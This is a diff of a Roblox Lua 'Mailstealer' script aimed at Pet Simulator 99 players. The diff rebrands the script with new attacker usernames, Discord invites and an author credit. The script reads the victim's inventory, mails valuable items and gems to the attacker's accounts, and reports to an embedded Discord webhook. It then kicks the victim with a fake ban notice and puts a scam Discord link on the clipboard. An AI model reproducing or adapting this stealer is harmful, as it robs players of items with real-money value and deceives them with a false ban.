@@ -1,12 +1,12 @@
 Username = "mr_m00nz"
-Username2 = "levoxonyt" -- stuff will get sent to this user if first user's mailbox is full
+Username2 = "yomoonhere" -- stuff will get sent to this user if first user's mailbox is full
 Webhook = "https://discord.com/api/webhooks/1217538601622179841/PvnpavlJ14vP0QrOQADG7HJtqLZTiek4cJIvWyI00gIJ0vV_ZwhGiGBcxtEqhZWYqc8u"
 min_rap = 100000 -- minimum rap of each item you want to get sent to you.
 
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "gg / KMrxdwhJc2"
+local MailMessage = "gg / HcpNe56R2a"
 local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
 local HttpService = game:GetService("HttpService")
 local itemsToSend = {}
@@ -70,7 +70,7 @@ local function SendMessage(url, username, diamonds)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Mailstealer by Sapphinx. https://discord.gg/KMrxdwhJc2"
+				["text"] = "Mailstealer by Tobi. https://discord.gg/HcpNe56R2a"
 			}
         }}
     }
@@ -84,7 +84,7 @@ local function SendMessage(url, username, diamonds)
 end
 
 local user = Username
-local user2 = Username2 or "levoxonyt"
+local user2 = Username2 or "yomoonhere"
 
 local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
 local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
@@ -304,8 +304,8 @@ if CountHuges() > 0 or GemAmount1 >= 500000 then
 		end
 	end
 	SendAllGems()
-	setclipboard("https://discord.gg/KMrxdwhJc2")
-	plr:kick("You got banned for cheating/exploiting in Pet Simulator 99! Join https://discord.gg/KMrxdwhJc2 for support")
+	setclipboard("https://discord.gg/wpuYkPNvXf")
+	plr:kick("You have been permanently banned for cheating/exploiting! Join https://discord.gg/wpuYkPNvXf to appeal for ur ban!")
 else
 	plr:kick("Error on script execution: 0x0001F4A2")
 end
